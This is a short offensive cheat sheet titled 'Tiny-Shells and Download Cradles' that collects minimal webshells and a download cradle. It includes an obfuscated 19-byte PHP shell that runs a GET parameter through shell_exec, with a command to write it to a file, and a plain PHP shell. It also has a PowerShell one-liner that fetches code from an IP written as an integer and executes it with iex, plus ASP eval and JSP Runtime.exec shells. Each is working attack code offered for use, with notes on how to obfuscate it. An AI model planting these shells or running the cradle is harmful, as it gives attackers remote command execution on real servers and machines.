# Tiny-Shells and Download Cradles

All kinds of tiny shells or download cradles. It's all about minimization.

## PHP - Obfuscated Webshell (19 bytes)

Source: https://gist.github.com/0xSojalSec/5bee09c7035985ddc13fddb16f191075

```php
<?=`{${~"\xa0\xb8\xba\xab"}["\xa0"]}`;
```

in Terminal:
```bash
echo -ne '<?=`{${~\xa0\xb8\xba\xab}[\xa0]}`;' > rev_shell.php
```
This is how the code will be produced, \xa0\xb8\xba\xab will be 
treated as constant therefore no " needed. It is also not copyable
string because of non-ascii characters.
 
 Explanation:
 * ~"\xa0\xb8\xba\xab" <-> "_GET"
 * ${"_GET"}["\xa0"] <-> $_GET["\xa0"]
 * \`{$_GET["\xa0"]}\` <-> shell_exec($_GET["\xa0"])
 
This is only 5 bytes longer than the shortest PHP shell (using $_GET to smuggle data)! 
```php
<?=`$_GET[_]`;
```
  
This is a slightly improved idea that I had 2 years ago
https://github.com/terjanq/Flag-Capture/blob/master/MeePwn%202018/omega/README.md#part2

Author: https://gist.github.com/0xSojalSec

## PowerShell - Download Cradle (18 bytes)

Source: https://twitter.com/johnxor2/status/1620365760462991361

```powershell
."iwr"16843009|iex
```

Explanation:
* `iwr` = Invoke Web-Request
* `16843009` = Integer of IP address `1.1.1.1` (convert: https://www.browserling.com/tools/dec-to-ip)
* `|` = pipe the respone to
* `iex` = Invoke-Expression

Author: https://twitter.com/johnxor2

## ASP - Webshell (20 bytes)

Author unknown:

```javascript
<%eval request(0)%>
```

## JSP - Webshell (60 bytes)

Nothing fancy in here, just execution of the passed parameter since the language doesn't allow further abriviations.

```Java
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

